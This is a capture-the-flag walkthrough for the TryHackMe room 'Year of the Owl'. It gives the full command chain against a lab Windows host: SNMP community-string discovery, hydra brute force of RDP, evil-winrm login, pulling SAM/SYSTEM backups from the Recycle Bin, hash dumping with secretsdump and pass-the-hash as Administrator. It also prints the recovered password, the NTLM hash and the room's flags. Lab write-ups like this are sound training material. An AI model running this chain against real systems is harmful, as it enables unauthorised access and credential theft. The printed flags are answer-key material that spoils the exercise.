# CTF: Year of the Owl (THM)

**Target IP:** `10.48.180.46` ($target)

## Metadata

- **CTF Name:** Year of the Owl
    
- **Platform:** TryHackMe
    
- **Date:** 2026-04-29
    
- **Difficulty:** Hard
    
- **Tools Used:** nmap, onesixtyone, snmp-check, hydra, evil-winrm, impacket-secretsdump
    
- **Key Skills/Tools:** SNMP Enumeration, Password Brute-forcing, WinRM Exploitation, Hidden Directory Discovery (gci -path), SAM/SYSTEM Backup Extraction, Pass-the-Hash (PtH).
    

## Introduction

This walkthrough documents the exploitation of **Year of the Owl** on TryHackMe. The attack path involves discovering a hidden SNMP community string, enumerating the system for a valid username, and brute-forcing RDP/WinRM access. Privilege escalation is achieved by identifying sensitive backup registry hives (`sam.bak` and `system.bak`) hidden within a specific SID folder inside the `$Recycle.Bin` directory.

**Limitations & Confidence:**

- **Confidence Level:** High. This writeup is strictly based on the exact command history and file paths provided in the session logs.
    
- **Limitations:** The initial foothold relies on the `openview` SNMP community string being present in the `snmp-onesixtyone.txt` wordlist.
    

## Reconnaissance

### 1. Port Scanning

Initial identification of open ports and services using a multi-stage Nmap scan.

**Command:**

```
😎 amuzed@Kali (~/THM/Year_Of_The_Owl)
$ nmap -p- -Pn $target -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN nmap_ports.txt && sleep 5 && nmap -Pn $target -sV -sC -v -oN nmap_sVsC.txt && sleep 5 && nmap -T5 -Pn $target -v --script vuln -oN nmap_vuln.txt
```

### 2. SNMP Enumeration

Identifying the SNMP community string and enumerating system information.

**Command (onesixtyone):**

```
😎 amuzed@Kali (~/THM/Year_Of_The_Owl)
$ onesixtyone $target -c /usr/share/wordlists/seclists/Discovery/SNMP/snmp-onesixtyone.txt
```

- **Result:** Community string `openview` discovered.
    

**Command (snmp-check):**

```
😎 amuzed@Kali (~/THM/Year_Of_The_Owl)
$ snmp-check -t $target -c openview
```

- **Discovered Username:** `Jareth`
    

## Foothold

### 1. Password Brute-force (Hydra)

Brute-forcing the RDP service using the discovered username and `rockyou.txt`.

**Command:**

```
😎 amuzed@Kali (~/THM/Year_Of_The_Owl)
$ hydra -l jareth -P /usr/share/wordlists/rockyou.txt $target rdp
```

- **Credentials Found:** `jareth:sarah`
    

### 2. Initial Access (WinRM)

**Command:**

```
😎 amuzed@Kali (~/THM/Year_Of_The_Owl)
$ evil-winrm -i $target -u Jareth -p sarah
```

## Privilege Escalation

### 1. Locating Hidden Registry Backups

After gaining access, I checked the root of the C: drive for hidden system folders and discovered the contents of the Recycle Bin.

**Command:**

```
*Evil-WinRM* PS C:\> gci -path 'C:\$Recycle.Bin' -h
```

Navigating into the user-specific SID directory revealed the backup files:

```
*Evil-WinRM* PS C:\> cd 'C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-1001'
*Evil-WinRM* PS C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-1001> dir

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/18/2020   7:28 PM          49152 sam.bak
-a----        9/18/2020   7:28 PM       17457152 system.bak
```

### 2. Hash Extraction

I copied the backups to `C:\Windows\Temp` to facilitate the download to my local Kali machine.

**Commands (Target):**

```
copy sam.bak C:\Windows\Temp\sam.bak
copy system.bak C:\Windows\Temp\System.bak
download C:\Windows\Temp\sam.bak /home/amuzed/THM/Year_Of_The_Owl/sam.bak
download C:\Windows\Temp\system.bak /home/amuzed/THM/Year_Of_The_Owl/system.bak
```

**Command (Local Kali):**

```
😎 amuzed@Kali (~/THM/Year_Of_The_Owl)
$ impacket-secretsdump -sam sam.bak -system system.bak LOCAL
```

**Extracted Credentials:**

- **Administrator:** `500:aad3b435b51404eeaad3b435b51404ee:6bc99ede9edcfecf9662fb0c0ddcfa7a:::`
    

### 3. Root Access (Pass-the-Hash)

**Command:**

```
😎 amuzed@Kali (~/THM/Year_Of_The_Owl)
$ evil-winrm -i $target -u Administrator -H 6bc99ede9edcfecf9662fb0c0ddcfa7a
```

## Flags

- **User Flag:** `THM{YTMzYTM0M2Y0NjQ0MWViYTA2ZDUzNmI1}`
    
- **Root Flag:** `THM{YWFjZTM1Mjk0YTM0YjhkNjNmYTA2ZDUzNmI1}`
